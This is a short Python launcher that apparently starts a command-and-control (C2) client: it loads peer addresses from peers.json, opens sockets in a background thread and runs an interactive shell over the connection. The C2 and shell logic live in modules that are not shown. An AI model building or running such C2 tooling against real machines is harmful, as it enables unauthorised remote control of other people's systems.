from core.connect import C2Client
from core.shell import Shell
from threading import Thread
import json

with open("peers.json","r") as f:
    peers_json = json.load(f)
peers = [tuple(lst) for lst in peers_json]

client = C2Client(peers=peers)
Thread(target=client.setup_sockets, args=()).start()

Shell(client).run()